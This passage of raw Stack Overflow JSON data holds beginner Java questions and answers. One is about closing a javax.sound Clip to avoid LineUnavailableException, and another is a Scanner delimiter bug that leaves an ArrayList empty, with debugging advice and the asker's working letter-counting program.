(LineEvent.Type.STOP.equals(event.getType()) {\n        event.getLine().close();\n    }\n});\nclip.start();\n</code></pre>\n<p>This ensures that whenever a line is stopped (which happens when a clip has finished playing), the line is also closed and the used native resources are freed.</p>\n<p>Note that this means that you cannot simply play that same clip again, but that you must create/open a new clip.</p>\n"}],"owner":{"account_id":6899755,"reputation":524,"user_id":5299753,"accept_rate":73,"display_name":"Julian"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":286,"favorite_count":0,"down_vote_count":0,"up_vote_count":5,"answer_count":1,"score":5,"last_activity_date":1683722285,"creation_date":1462268514,"question_id":37000717,"body_markdown":"I am using the following code for loading a clip (javax.sound.sampled.Clip)\r\n\r\n    def createClip(file:String):Clip = {\r\n        val clip = AudioSystem.getClip()\r\n        clip.open(AudioSystem.getAudioInputStream(new File(s&quot;sounds/$file.wav&quot;)))\r\n        clip\r\n    }\r\n\r\nIts written in Scala but I guess anyone not familiar with scala but java will see that its basically the same, as one would do with java.\r\n\r\nMy attempt was to make it effortless to play a sound like this\r\n\r\n    createClip(&quot;example_WAV_File&quot;).start()\r\n\r\nSince I will create a **new** Clip, each time I call a sound file, I thought there shouldn&#39;t be any problems concerning rewinding a clip etc.\r\nHowever in an actual Application (a Game), I used this library, to handle the sounds resulting of a Punch and all those stuff. Now here is the thing, when (lets say e.g.) punching several times, some when I will get  \r\n\r\n&gt; Exception in thread &quot;Thread-58&quot; javax.sound.sampled.LineUnavailableException: line with format PCM_SIGNED 44100.0 Hz, 16 bit, stereo, 4 bytes/frame, little-endian not supported.\r\n\r\nI once ran into a similar Error but that was about the bit encoding being above 16-bits. Since my file has 16-bit encoding I have no clue what this could be...\r\n\r\nAs said above, the Error **only** occurs when several clips are played.\r\nI figured, that this could indicate a memory problem. I naively thought, that the garbage collector would do all the work for me, as the clip would have lost any reference when leaving its scope. \r\n\r\nMy initial solution was, to hold a reference to any sound I am going to play, and only rewind it when another instance requires an already played sound. This solution would never break but it was not really able to play the same clip two times. Thats why I switched to loading a clip several times when required. \r\n\r\nI figured, that I probably should use a close() method on the clip.\r\n\r\n    val clip = createClip(&quot;example_WAV_file&quot;)\r\n    clip.start()\r\n    clip.close()\r\n\r\nThis actually solved my Problem, enhancing my guess, that it is probably memory related, but also, now the clip would stop immediately after starting it. \r\n\r\nDo I really need to create a thread for each clip, waiting for the *clip.getMicrosecondLength()* time to close it? That sounds rather crappy.\r\n\r\nOnly option left -&gt; I am using the sound API really really wrongly, even though I thought, that I was using it just the way some tutorials showed me. So where is my particular mistake? Or what is the solution to being able to play the same clip two times, at the same time? ","title":"Java sound - LineUnavailableException:","body":"<p>I am using the following code for loading a clip (javax.sound.sampled.Clip)</p>\n\n<pre><code>def createClip(file:String):Clip = {\n    val clip = AudioSystem.getClip()\n    clip.open(AudioSystem.getAudioInputStream(new File(s\"sounds/$file.wav\")))\n    clip\n}\n</code></pre>\n\n<p>Its written in Scala but I guess anyone not familiar with scala but java will see that its basically the same, as one would do with java.</p>\n\n<p>My attempt was to make it effortless to play a sound like this</p>\n\n<pre><code>createClip(\"example_WAV_File\").start()\n</code></pre>\n\n<p>Since I will create a <strong>new</strong> Clip, each time I call a sound file, I thought there shouldn't be any problems concerning rewinding a clip etc.\nHowever in an actual Application (a Game), I used this library, to handle the sounds resulting of a Punch and all those stuff. Now here is the thing, when (lets say e.g.) punching several times, some when I will get  </p>\n\n<blockquote>\n  <p>Exception in thread \"Thread-58\" javax.sound.sampled.LineUnavailableException: line with format PCM_SIGNED 44100.0 Hz, 16 bit, stereo, 4 bytes/frame, little-endian not supported.</p>\n</blockquote>\n\n<p>I once ran into a similar Error but that was about the bit encoding being above 16-bits. Since my file has 16-bit encoding I have no clue what this could be...</p>\n\n<p>As said above, the Error <strong>only</strong> occurs when several clips are played.\nI figured, that this could indicate a memory problem. I naively thought, that the garbage collector would do all the work for me, as the clip would have lost any reference when leaving its scope. </p>\n\n<p>My initial solution was, to hold a reference to any sound I am going to play, and only rewind it when another instance requires an already played sound. This solution would never break but it was not really able to play the same clip two times. Thats why I switched to loading a clip several times when required. </p>\n\n<p>I figured, that I probably should use a close() method on the clip.</p>\n\n<pre><code>val clip = createClip(\"example_WAV_file\")\nclip.start()\nclip.close()\n</code></pre>\n\n<p>This actually solved my Problem, enhancing my guess, that it is probably memory related, but also, now the clip would stop immediately after starting it. </p>\n\n<p>Do I really need to create a thread for each clip, waiting for the <em>clip.getMicrosecondLength()</em> time to close it? That sounds rather crappy.</p>\n\n<p>Only option left -> I am using the sound API really really wrongly, even though I thought, that I was using it just the way some tutorials showed me. So where is my particular mistake? Or what is the solution to being able to play the same clip two times, at the same time? </p>\n"},{"tags":["java","arraylist","split","readfile"],"comments":[{"owner":{"account_id":3116234,"reputation":9296,"user_id":2636929,"display_name":"Stultuske"},"score":0,"creation_date":1614980833,"post_id":66500024,"comment_id":117560747,"body_markdown":"have you checked whether or not it gets in the while loop? Does he find the right file?","body":"have you checked whether or not it gets in the while loop? Does he find the right file?"},{"owner":{"account_id":7547772,"reputation":8583,"user_id":5730279,"display_name":"hc_dev"},"score":0,"creation_date":1614991694,"post_id":66500024,"comment_id":117563011,"body_markdown":"&quot;decided for the first time to ask&quot; - and you asked very well: clear formulated, research demonstrated, example given, struggles pointed out, well formatted &#128077;️","body":"&quot;decided for the first time to ask&quot; - and you asked very well: clear formulated, research demonstrated, example given, struggles pointed out, well formatted 👍️"}],"answers":[{"tags":[],"owner":{"account_id":2788286,"reputation":166,"user_id":2399111,"display_name":"DLynch"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1614981218,"creation_date":1614981218,"answer_id":66500114,"question_id":66500024,"body_markdown":"    String[] textArray = text.toArray(new String[0]);\r\n\r\nThis line is your problem. You&#39;re trying to allocate the ArrayList into a String array of size 0, resulting in it appearing empty.\r\n\r\nI would modify the array declaration to initialize using the ArrayList size, like so:\r\n\r\n    String[] textArray = text.toArray(new String[text.size()]);\r\n\r\nThen you can see if your token delimiter works.","title":"Java - Read text file and store it using scanner, gives me empty ArrayList. Split words by using Delimeter","body":"<pre><code>String[] textArray = text.toArray(new String[0]);\n</code></pre>\n<p>This line is your problem. You're trying to allocate the ArrayList into a String array of size 0, resulting in it appearing empty.</p>\n<p>I would modify the array declaration to initialize using the ArrayList size, like so:</p>\n<pre><code>String[] textArray = text.toArray(new String[text.size()]);\n</code></pre>\n<p>Then you can see if your token delimiter works.</p>\n"},{"tags":[],"owner":{"account_id":7547772,"reputation":8583,"user_id":5730279,"display_name":"hc_dev"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1614997894,"creation_date":1614997311,"answer_id":66501765,"question_id":66500024,"body_markdown":"### Quick recap of your steps\r\nYour program does a lot. I counted 9 steps:\r\n\r\n1. opens a (text) file as (text) *input-stream* to read from\r\n2. create a scanner for *tokens* from this *input-stream* using a *regular-expression* as delimiter (= tokenizer)\r\n3. scan for and *iterate* over each subsequent *token* (if any found) using a while-loop\r\n4. each of this *iteration* adds the *token* to a list\r\n5. if no more tokens, then iteration ends (or never started!): converts the list to array\r\n6. loop over each array element using a for-each-loop and print it\r\n7. check if originally collected list is empty and print true or false\r\n8. catch the exception if file was not found and print the it\r\n9. finally close any opened resources: the file that was read from\r\n\r\nNow let&#39;s start to look for the step where something potentially could go wrong: the places for errors &#128527;️\r\n \r\n### Analysis: What can go wrong?\r\nLook at the listed steps above and think of each from a what-could-go-wrong perspective, a quick check list (not correlated to the step-numbers above!):\r\n\r\n 1. Can your text-file be found, does it exist and is readable? Yes, otherwise any `IOException` like `FileNotFoundException` would have been thrown and printed.\r\n 2. Is the opened file empty with a size of 0 bytes? You can check using:\r\n    ```java\r\n    File textFile = new File(&quot;\\\\Users\\\\marga\\\\Desktop\\\\objekt program\\\\oo2021\\\\w05_kontrolltoo1\\\\textHere.txt&quot;);\r\n    System.out.println( &quot;File size: &quot; + textFile.length() );\r\n    // before passing the extracted file-variable to scanner\r\n    scan = new Scanner( textFile ).useDelimiter(&quot; \\\\$ |[\\\\r\\\\n]+&quot;);\r\n    ```\r\n 3. Does the delimiter/regex properly split/tokenize an example input string? Try:\r\n    ```java\r\n    // Just a separate test: same delimiter, with test-input\r\n    String delimiterRegex = &quot; \\\\$ |[\\\\r\\\\n]+&quot;;\r\n    String testInput = &quot; $ Hello\\r\\nWorld !\\n\\nBye.&quot;;\r\n    // so we create a new scanner\r\n    Scanner testScanner = new Scanner( testInput ).useDelimiter(delimiterRegex);\r\n    int tokenCount = 0;\r\n    while( testScanner.hasNext() ) {\r\n        tokenCount++;\r\n        System.out.println(&quot;Token &quot; + tokenCount + &quot;: &quot; + testScanner.next() );\r\n    }\r\n    testScanner.close();\r\n    ```\r\n    Should print 3 tokens (`Hello`, `World !`, `Bye.`) on 3 lines in console. The special sequence ` $ ` (space-dollar-space), any `\\n` or `\\r` (newline or carriage-return) are omitted and have split the tokens.\r\n\r\n4. We should check the list directly after the while-loop:\r\n    ```java\r\n    // Not only checking if the ArrayList is empty, but its size (is 0 if empty)\r\n    System.out.println(&quot;Scanned tokens in list: &quot; + text.size());\r\n    ```\r\n    If it is empty, then we neither need to fill the array, nor loop to print will start (because nothing to loop).\r\n\r\nHope these explanations help you to perform the analysis (debugging/testing) yourself.\r\nLet me know if it helped you to catch the issue.\r\n\r\n### Takeaway: Divide and conquer!\r\nWhy did I count the steps, above? Because all are potential places for errors.\r\nIn developer jargon we also say this `main` method of class `PlaceForErrors` has many responsibilities: counted 9.\r\n\r\nAnd there is a golden principle called Single Responsibility Principle (SRP).\r\nPut simply: It is always good to split a large problem or program (here: your large `main` method) into smaller pieces. These smaller pieces are easier to work with (mentally), easier to test, easier to debug if errors or unexpected happens. Divide &amp; conquer!\r\n\r\n### If it works, start improving\r\nYou can split up this long method doing 9 steps into smaller methods.\r\nBenefit: each method can be tested in isolation, like the `testScanner`.\r\n\r\nIf your program finally works as expected and your manual test went green.\r\nThen you should post the working code to the sister-site: [CodeReview](http://codereview.stackexchange.com). \r\n\r\nBe curious and ask again, e.g. how to split up the methods, how to make testable, etc.\r\nYou&#39;ll get lot&#39;s of experienced advise on how to improve it even more.","title":"Java - Read text file and store it using scanner, gives me empty ArrayList. Split words by using Delimeter","body":"<h3>Quick recap of your steps</h3>\n<p>Your program does a lot. I counted 9 steps:</p>\n<ol>\n<li>opens a (text) file as (text) <em>input-stream</em> to read from</li>\n<li>create a scanner for <em>tokens</em> from this <em>input-stream</em> using a <em>regular-expression</em> as delimiter (= tokenizer)</li>\n<li>scan for and <em>iterate</em> over each subsequent <em>token</em> (if any found) using a while-loop</li>\n<li>each of this <em>iteration</em> adds the <em>token</em> to a list</li>\n<li>if no more tokens, then iteration ends (or never started!): converts the list to array</li>\n<li>loop over each array element using a for-each-loop and print it</li>\n<li>check if originally collected list is empty and print true or false</li>\n<li>catch the exception if file was not found and print the it</li>\n<li>finally close any opened resources: the file that was read from</li>\n</ol>\n<p>Now let's start to look for the step where something potentially could go wrong: the places for errors 😏️</p>\n<h3>Analysis: What can go wrong?</h3>\n<p>Look at the listed steps above and think of each from a what-could-go-wrong perspective, a quick check list (not correlated to the step-numbers above!):</p>\n<ol>\n<li><p>Can your text-file be found, does it exist and is readable? Yes, otherwise any <code>IOException</code> like <code>FileNotFoundException</code> would have been thrown and printed.</p>\n</li>\n<li><p>Is the opened file empty with a size of 0 bytes? You can check using:</p>\n<pre class=\"lang-java prettyprint-override\"><code>File textFile = new File(&quot;\\\\Users\\\\marga\\\\Desktop\\\\objekt program\\\\oo2021\\\\w05_kontrolltoo1\\\\textHere.txt&quot;);\nSystem.out.println( &quot;File size: &quot; + textFile.length() );\n// before passing the extracted file-variable to scanner\nscan = new Scanner( textFile ).useDelimiter(&quot; \\\\$ |[\\\\r\\\\n]+&quot;);\n</code></pre>\n</li>\n<li><p>Does the delimiter/regex properly split/tokenize an example input string? Try:</p>\n<pre class=\"lang-java prettyprint-override\"><code>// Just a separate test: same delimiter, with test-input\nString delimiterRegex = &quot; \\\\$ |[\\\\r\\\\n]+&quot;;\nString testInput = &quot; $ Hello\\r\\nWorld !\\n\\nBye.&quot;;\n// so we create a new scanner\nScanner testScanner = new Scanner( testInput ).useDelimiter(delimiterRegex);\nint tokenCount = 0;\nwhile( testScanner.hasNext() ) {\n    tokenCount++;\n    System.out.println(&quot;Token &quot; + tokenCount + &quot;: &quot; + testScanner.next() );\n}\ntestScanner.close();\n</code></pre>\n<p>Should print 3 tokens (<code>Hello</code>, <code>World !</code>, <code>Bye.</code>) on 3 lines in console. The special sequence <code>$</code> (space-dollar-space), any <code>\\n</code> or <code>\\r</code> (newline or carriage-return) are omitted and have split the tokens.</p>\n</li>\n<li><p>We should check the list directly after the while-loop:</p>\n<pre class=\"lang-java prettyprint-override\"><code>// Not only checking if the ArrayList is empty, but its size (is 0 if empty)\nSystem.out.println(&quot;Scanned tokens in list: &quot; + text.size());\n</code></pre>\n<p>If it is empty, then we neither need to fill the array, nor loop to print will start (because nothing to loop).</p>\n</li>\n</ol>\n<p>Hope these explanations help you to perform the analysis (debugging/testing) yourself.\nLet me know if it helped you to catch the issue.</p>\n<h3>Takeaway: Divide and conquer!</h3>\n<p>Why did I count the steps, above? Because all are potential places for errors.\nIn developer jargon we also say this <code>main</code> method of class <code>PlaceForErrors</code> has many responsibilities: counted 9.</p>\n<p>And there is a golden principle called Single Responsibility Principle (SRP).\nPut simply: It is always good to split a large problem or program (here: your large <code>main</code> method) into smaller pieces. These smaller pieces are easier to work with (mentally), easier to test, easier to debug if errors or unexpected happens. Divide &amp; conquer!</p>\n<h3>If it works, start improving</h3>\n<p>You can split up this long method doing 9 steps into smaller methods.\nBenefit: each method can be tested in isolation, like the <code>testScanner</code>.</p>\n<p>If your program finally works as expected and your manual test went green.\nThen you should post the working code to the sister-site: <a href=\"http://codereview.stackexchange.com\">CodeReview</a>.</p>\n<p>Be curious and ask again, e.g. how to split up the methods, how to make testable, etc.\nYou'll get lot's of experienced advise on how to improve it even more.</p>\n"},{"tags":[],"owner":{"account_id":20881834,"reputation":11,"user_id":15339381,"display_name":"Margarita Zahharova"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1615242001,"creation_date":1615242001,"answer_id":66538066,"question_id":66500024,"body_markdown":"***Thank you for your input everyone!***\r\n\r\nRegarding the code, I went and checked everything step by step and on the way learned more about delimiters and scanner. I fixed my delimiter and everything worked just fine now. \r\n\r\nBeside the fact that I made a newbie mistake and didn&#180;t show the full code, as I though it would take away the attention from the main problem. I had two conflicting scanners in my main function(one I showed you and the other one was scanning again and counting letters A). And they both worked great separately(when one or the other is commented out), but refused to work together. So I found a way to combine them and use scanner only once. I will share my full code for reference now.\r\n\r\n*I learned my mistake, and will provide the my full code always in the future.* \r\n\r\nIf someone is curious the full task was the following: \r\n\r\n 1. Read the text from a separate file using scanner and store it in an Array List.\r\n 2. Count how many letters &quot;A&quot; (small or big) there were and how big of % they made out of all the letters in the text.\r\n 3. Count how many words had one letter A, two letters A in them, etc.\r\n\r\n```\r\nimport java.io.File;\r\nimport java.io.FileNotFoundException;\r\nimport java.util.ArrayList;\r\nimport java.util.Scanner;\r\n\r\n\r\n\r\npublic class Trying {\r\n    public static void main(String[] args) {\r\n        Scanner scan = null;\r\n        try {\r\n\r\n\r\n            //SCANNING FILE AND CREATING AN ARRAYLIST\r\n            scan = new Scanner(new File(&quot;\\\\Users\\\\marga\\\\Desktop\\\\objekt program\\\\oo2021\\\\w05_kontrolltoo1\\\\textHere.txt&quot;)).useDelimiter(&quot;[.,:;()?!\\&quot;\\\\s]+&quot;);\r\n            \r\n            int aCount = 0;\r\n            int letterCount =0;\r\n            String token1 = &quot;&quot;;\r\n            int wordWithAtLeastOneA = 0;\r\n            int wordWithA = 0;\r\n            int word1A = 0;\r\n            int word2A = 0;\r\n            int word3A = 0;\r\n            int word4OrMoreA = 0;\r\n\r\n            ArrayList&lt;String&gt; text = new ArrayList&lt;String&gt;();\r\n\r\n\r\n            // SCANNING EVERY WORD INTO AN ARRAY LIST\r\n            while(scan.hasNext()){\r\n                token1 = scan.next();\r\n                text.add(token1);\r\n            }\r\n            System.out.println(&quot;Amount of words in the scanned list is : &quot; + text.size());\r\n\r\n            //COUNTING HOW MANY LETTERS &#39;A&#39; TEXT HAS\r\n            for(String element : text){\r\n                for (int i=0;i&lt;=element.length()-1;i++){\r\n                    if (element.charAt(i) == &#39;A&#39; || element.charAt(i) == &#39;a&#39;) {\r\n                        aCount++; \r\n                    } \r\n                }           \r\n            }\r\n            System.out.println(&quot;There are &quot;+aCount+&quot; letters &#39;A&#39;. &quot;); \r\n            \r\n            //HOW MANY LETTERS IN TOTAL TEXT HAS\r\n            for(String element : text){\r\n                for (int i=0;i&lt;=element.length()-1;i++){\r\n                    letterCount++;    \r\n                }       \r\n            }\r\n\r\n            //COUNTING HOW MANY WORDS HAVE &#39;A&#39; LETTER IN THEM\r\n            for(String element : text){\r\n                for (int i=0;i&lt;=element.length()-1;i++){\r\n                    if (element.charAt(i) == &#39;A&#39; || element.charAt(i) == &#39;a&#39;) {\r\n                        wordWithAtLeastOneA++;;\r\n                        break; \r\n                    } \r\n                }           \r\n            }\r\n            System.out.println(&quot;There are &quot;+wordWithAtLeastOneA+&quot; words that have at least one letter &#39;A&#39; in them.&quot;);\r\n            \r\n\r\n            System.out.println();\r\n\r\n            //COUNTING NUMBER OF WORDS THAT HAVE 1/2/3 or more &#39;A&#39; LETTER IN THEM\r\n            for(String element : text){\r\n            wordWithA = 0;\r\n                for (int i=0;i&lt;=element.length()-1;i++){\r\n                    if (element.charAt(i) == &#39;A&#39; || element.charAt(i) == &#39;a&#39;) {\r\n                        wordWithA++;\r\n            if(wordWithA == 1){\r\n                word1A++;\r\n            }else if (wordWithA == 2){\r\n                word2A++;\r\n            }else if (wordWithA == 3){\r\n                word3A++;\r\n            }else if (wordWithA &gt;= 4){\r\n                word4OrMoreA++;\r\n            } \r\n                    } \r\n                }             \r\n            }\r\n            System.out.println(&quot;There were &quot;+ word1A+ &quot; words, that had one letter &#39;A&#39; in them.&quot; );\r\n            System.out.println(&quot;There were &quot;+ word2A+ &quot; words, that had two letters &#39;A&#39; in them.&quot; );\r\n            System.out.println(&quot;There were &quot;+ word3A+ &quot; words, that had three letters &#39;A&#39; in them.&quot; );\r\n            System.out.println(&quot;There were &quot;+ word4OrMoreA+ &quot; words, that had 4 or more letters &#39;A&#39; in them.&quot; );\r\n\r\n\r\n           //COUNTING HOW MANY LETTERS THERE ARE IN TOTAL, COMPARE TO NUMBER OF &quot;A&quot; LETTERS\r\n            \r\n            int percentOfA = aCount*100/letterCount;\r\n            System.out.println();\r\n            System.out.println(&quot;The entire number of letters is &quot;+ letterCount+&quot; and letter &#39;A&#39; makes &quot; + percentOfA+ &quot;% out of them or &quot; +aCount+ &quot; letters.&quot;);\r\n\r\n          //  for(String element : textArray){\r\n          //      System.out.println(element);\r\n          //  }\r\n    \r\n        } catch (FileNotFoundException exception) {\r\n            System.out.println(exception);\r\n        }\r\n        finally{\r\n            scan.close();\r\n        }\r\n    \r\n    }\r\n}\r\n\r\n```\r\n\r\nAnd the text is:\r\n\r\n&gt; Computer programming is an enormously flexible tool that you can use to do amazing things that are otherwise either manual and laborsome or are just impossible.\r\n If you are using a smartphone, a chat app or if you are unlocking your car with the push of a button,\r\n  then you must know that all these things are using some kind of programming. \r\n  You are already immersed in the programs of different types.\r\n   In fact, software is running your life. What if you learn and start running these programs according to your will?\r\n\r\nAnd the output is:\r\n```\r\nThere are 35 words that have at least one letter &#39;A&#39; in them.\r\n\r\nThere were 35 words, that had one letter &#39;A&#39; in them.\r\nThere were 3 words, that had two letters &#39;A&#39; in them.\r\nThere were 0 words, that had three letters &#39;A&#39; in them.\r\nThere were 0 words, that had 4 or more letters &#39;A&#39; in them.\r\n\r\nThe entire number of letters is  416 and letter &#39;A&#39; makes 9% out of them or 38 letters.\r\n```\r\n\r\n","title":"Java - Read text file and store it using scanner, gives me empty ArrayList. Split words by using Delimeter","body":"<p><em><strong>Thank you for your input everyone!</strong></em></p>\n<p>Regarding the code, I went and checked everything step by step and on the way learned more about delimiters and scanner. I fixed my delimiter and everything worked just fine now.</p>\n<p>Beside the fact that I made a newbie mistake and didn´t show the full code, as I though it would take away the attention from the main problem. I had two conflicting scanners in my main function(one I showed you and the other one was scanning again and counting letters A). And they both worked great separately(when one or the other is commented out), but refused to work together. So I found a way to combine them and use scanner only once. I will share my full code for reference now.</p>\n<p><em>I learned my mistake, and will provide the my full code always in the future.</em></p>\n<p>If someone is curious the full task was the following:</p>\n<ol>\n<li>Read the text from a separate file using scanner and store it in an Array List.</li>\n<li>Count how many letters &quot;A&quot; (small or big) there were and how big of % they made out of all the letters in the text.</li>\n<li>Count how many words had one letter A, two letters A in them, etc.</li>\n</ol>\n<pre><code>import java.io.File;\nimport java.io.FileNotFoundException;\nimport java.util.ArrayList;\nimport java.util.Scanner;\n\n\n\npublic class Trying {\n    public static void main(String[] args) {\n        Scanner scan = null;\n        try {\n\n\n            //SCANNING FILE AND CREATING AN ARRAYLIST\n            scan = new Scanner(new File(&quot;\\\\Users\\\\marga\\\\Desktop\\\\objekt program\\\\oo2021\\\\w05_kontrolltoo1\\\\textHere.txt&quot;)).useDelimiter(&quot;[.,:;()?!\\&quot;\\\\s]+&quot;);\n            \n            int aCount = 0;\n            int letterCount =0;\n            String token1 = &quot;&quot;;\n            int wordWithAtLeastOneA = 0;\n            int wordWithA = 0;\n            int word1A = 0;\n            int word2A = 0;\n            int word3A = 0;\n            int word4OrMoreA = 0;\n\n            ArrayList&lt;String&gt; text = new ArrayList&lt;String&gt;();\n\n\n            // SCANNING EVERY WORD INTO AN ARRAY LIST\n            while(scan.hasNext()){\n                token1 = scan.next();\n                text.add(token1);\n            }\n            System.out.println(&quot;Amount of words in the scanned list is : &quot; + text.size());\n\n            //COUNTING HOW MANY LETTERS 'A' TEXT HAS\n            for(String element : text){\n                for (int i=0;i&lt;=element.length()-1;i++){\n                    if (element.charAt(i) == 'A' || element.charAt(i) == 'a') {\n                        aCount++; \n                    } \n                }           \n            }\n            System.out.println(&quot;There are &quot;+aCount+&quot; letters 'A'. &quot;); \n            \n            //HOW MANY LETTERS IN TOTAL TEXT HAS\n            for(String element : text){\n                for (int i=0;i&lt;=element.length()-1;i++){\n                    letterCount++;    \n                }       \n            }\n\n            //COUNTING HOW MANY WORDS HAVE 'A' LETTER IN THEM\n            for(String element : text){\n                for (int i=0;i&lt;=element.length()-1;i++){\n                    if (element.charAt(i) == 'A' || element.charAt(i) == 'a') {\n                        wordWithAtLeastOneA++;;\n                        break; \n                    } \n                }           \n            }\n            System.out.println(&quot;There are &quot;+wordWithAtLeastOneA+&quot; words that have at least one letter 'A' in them.&quot;);\n            \n\n            System.out.println();\n\n            //COUNTING NUMBER OF WORDS THAT HAVE 1/2/3 or more 'A' LETTER IN THEM\n            for(String element : text){\n            wordWithA = 0;\n                for (int i=0;i&lt;=element.length()-1;i++){\n                    if (element.charAt(i) == 'A' || element.charAt(i) == 'a') {\n                        wordWithA++;\n            if(wordWithA == 1){\n                word1A++;\n            }else if (wordWithA == 2){\n                word2A++;\n            }else if (wordWithA == 3){\n                word3A++;\n            }else if (wordWithA &gt;= 4){\n                word4OrMoreA++;\n            } \n                    } \n                }             \n            }\n            System.out.println(&quot;There were &quot;+ word1A+ &quot; words, that had one letter 'A' in them.&quot; );\n            System.out.println(&quot;There were &quot;+ word2A+ &quot; words, that had two letters 'A' in them.&quot; );\n            System.out.println(&quot;There were &quot;+ word3A+ &quot; words, that had three letters 'A' in them.&quot; );\n            System.out.println(&quot;There were &quot;+ word4OrMoreA+ &quot; words, that had 4 or more letters 'A' in them.&quot; );\n\n\n           //COUNTING HOW MANY LETTERS THERE ARE IN TOTAL, COMPARE TO NUMBER OF &quot;A&quot; LETTERS\n            \n            int percentOfA = aCount*100/letterCount;\n            System.out.println();\n            System.out.println(&quot;The entire number of letters is &quot;+ letterCount+&quot; and letter 'A' makes &quot; + percentOfA+ &quot;% out of them or &quot; +aCount+ &quot; letters.&quot;);\n\n          //  for(String element : textArray){\n          //      System.out.println(element);\n          //  }\n    \n        } catch (FileNotFoundException exception) {\n            System.out.println(exception);\n        }\n        finally{\n            scan.close();\n        }\n    \n    }\n}\n\n</code></pre>\n<p>And the text is:</p>\n<blockquote>\n<p>Computer programming is an enormously flexible tool that you can use to do amazing things that are otherwise either manual and laborsome or are just impossible.\nIf you are using a smartphone, a chat app or if you are unlocking your car with the push of a button,\nthen you must know that all these things are using some kind of programming.\nYou are already immersed in the programs of different types.\nIn fact, software is running your life. What if you learn and start running these programs according to your will?</p>\n</blockquote>\n<p>And the output is:</p>\n<pre><code>There are 35 words that have at least one letter 'A' in them.\n\nThere were 35 words, that had one letter 'A' in them.\nThere were 3 words, that had two letters 'A' in them.\nThere were 0 words, that had three letters 'A' in them.\nThere were 0 words, that had 4 or more letters 'A' in them.\n\nThe entire number of letters is  416 and letter 'A' makes 9% out of them or 38 letters.\n</code></pre>\n"}],"owner":{"account_id":20881834,"reputation":11,"user_id":15339381,"display_name":"Margarita Zahharova"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":407,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":3,"score":1,"last_activity_date":1683721992,"creation_date":1614980552,"question_id":66500024,"body_markdown":"**Task is to read an article of text from outside file and put each word (no signs) into and Array List as a separate String.**\r\n Although I&#180;m sure my path is correct and readable(I can for example perform character count), no matter what I do my Array List of words from that article comes out as empty. I may be struggling with a way how to separate words from each other and other signs. Also with storing the result of reading.  \r\n\r\n*I&#180;ve been googling for the last 2 hours and reading similar answers here but no success. So decided for the first time to ask a question.* \r\n\r\n\r\n```\r\nimport java.io.File;\r\nimport java.io.FileNotFoundException;\r\nimport java.util.ArrayList;\r\nimport java.util.Scanner;\r\nimport org.w3c.dom.Text;\r\n\r\n\r\npublic class PlaceForErrors {\r\n    public static void main(String[] args) {\r\n        Scanner scan = null;\r\n        try {\r\n\r\n            \r\n            scan = new Scanner(new File(&quot;\\\\Users\\\\marga\\\\Desktop\\\\objekt program\\\\oo2021\\\\w05_kontrolltoo1\\\\textHere.txt&quot;)).useDelimiter(&quot; \\\\$ |[\\\\r\\\\n]+&quot;);\r\n           \r\n            String token1 = &quot;&quot;;\r\n            ArrayList&lt;String&gt; text = new ArrayList&lt;String&gt;();\r\n            while (scan.hasNext()) {\r\n\r\n                token1 = scan.next();\r\n                text.add(token1);\r\n                \r\n            }\r\n            \r\n            String[] textArray = text.toArray(new String[0]);\r\n            for(String element : textArray){\r\n                System.out.println(element);\r\n            }\r\n \r\n\r\n            //Controlling if the ArrayList is empty and it is\r\n            boolean tellme = text.isEmpty();\r\n            System.out.println(tellme);\r\n            \r\n\r\n\r\n    \r\n        } catch (FileNotFoundException exception) {\r\n            System.out.println(exception);\r\n        }\r\n        finally{\r\n            scan.close();\r\n        }\r\n    \r\n    }\r\n}\r\n```","title":"Java - Read text file and store it using scanner, gives me empty ArrayList. Split words by using Delimeter","body":"<p><strong>Task is to read an article of text from outside file and put each word (no signs) into and Array List as a separate String.</strong>\nAlthough I´m sure my path is correct and readable(I can for example perform character count), no matter what I do my Array List of words from that article comes out as empty. I may be struggling with a way how to separate words from each other and other signs. Also with storing the result of reading.</p>\n<p><em>I´ve been googling for the last 2 hours and reading similar answers here but no success. So decided for the first time to ask a question.</em></p>\n<pre><code>import java.io.File;\nimport java.io.FileNotFoundException;\nimport java.util.ArrayList;\nimport java.util.Scanner;\nimport org.w3c.dom.Text;\n\n\npublic class PlaceForErrors {\n    public static void main(String[] args) {\n        Scanner scan = null;\n        try {\n\n            \n            scan = new Scanner(new File(&quot;\\\\Users\\\\marga\\\\Desktop\\\\objekt program\\\\oo2021\\\\w05_kontrolltoo1\\\\textHere.txt&quot;)).useDelimiter(&quot; \\\\$ |[\\\\r\\\\n]+&quot;);\n           \n            String token1 = &quot;&quot;;\n            ArrayList&lt;String&gt; text = new ArrayList&lt;String&gt;();\n            while (scan.hasNext()) {\n\n                token1 = scan.next();\n                text.add(token1);\n                \n            }\n            \n            String[] textArray = text.toArray(new String[0]);\n            for(String element : textArray){\n                System.out.println(element);\n            }\n \n\n            //Controlling if the ArrayList is empty and it is\n            boolean tellme = text.isEmpty();\n            System.out.println(tellme);\n            \n\n\n    \n        } catch (FileNotFoundException exception) {\n            System.out.println(exception);\n        }\n        finally{\n            scan.close();\n        }\n    \n    }\n}\n</code></pre>\n"},{"tags":["java","java.util.scanner"],"comments":[{"owner":{"account_id":14835573,"reputation":300,"user_id":10713813,"display_name":"wittn"},"score":0,"creation_date":1590178353,"post_id":61963074,"comment_id":109592939,"body_markdown":"I&#39;m not quite sure what you are trying to accomplish in the loop? You seem to fill the array with the answer with the question?","body":"I&#39;m not quite sure what you are trying to accomplish in the loop? You seem to fill the array with the answer with the question?"},{"owner":{"account_id":18656661,"reputation":13,"user_id":13598912,"display_name":"Carson S."},"score":0,"creation_date":1590178683,"post_id":61963074,"comment_id":109593088,"body_markdown":"I&#39;m trying to get the 8 ball to read the user input and respond with a random line in a text file I gave it by value. I don&#39;t understand how I fill the array with the answer with the question.","body":"I&#39;m trying to get the 8 ball to read the user input and respond with a random line in a text file I gave it by value. I don&#39;t understand how I fill the array with the answer with the question."}],"answers":[{"tags":[],"owner":{"account_id":2179728,"reputation":73047,"user_id":10819573,"display_name":"Arvind Kumar 